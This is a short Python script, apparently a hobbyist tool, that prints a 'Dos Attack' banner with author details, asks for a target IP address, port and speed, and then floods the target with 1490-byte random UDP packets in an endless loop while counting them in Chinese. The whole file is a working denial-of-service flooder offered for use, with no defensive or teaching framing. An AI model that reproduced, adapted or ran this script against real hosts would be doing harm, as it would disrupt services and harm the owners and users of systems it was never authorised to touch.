# python3

import os, time, socket, random

def loading(n):
    icon = '|/-\\'
    for i in range(n + 1):
        print(f'\r{icon[i%4]} {i*100/n}%', end='')
        time.sleep(0.1)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("figlet Dos Attack")
print()
print("""
/---------------------------------------------------\\
|   作者          : Tempura                         |
|   作者github    : https://github.com/Alan1455     |
|   版本          : V1.0.0                          |
\\---------------------------------------------------/""")
print()
ip = input("IP:")
port = int(input("attack port:"))
sd = int(input("攻擊速度(1~1000):"))
print()
loading(100)

os.system("clear")

sent = 0
while True:
    sock.sendto(bytes, (ip,port))
    sent += 1
    print("已發送 %s 個封包到 %s 端口 %d" %(sent, ip, port))
    time.sleep((1000-sd) / 2000)
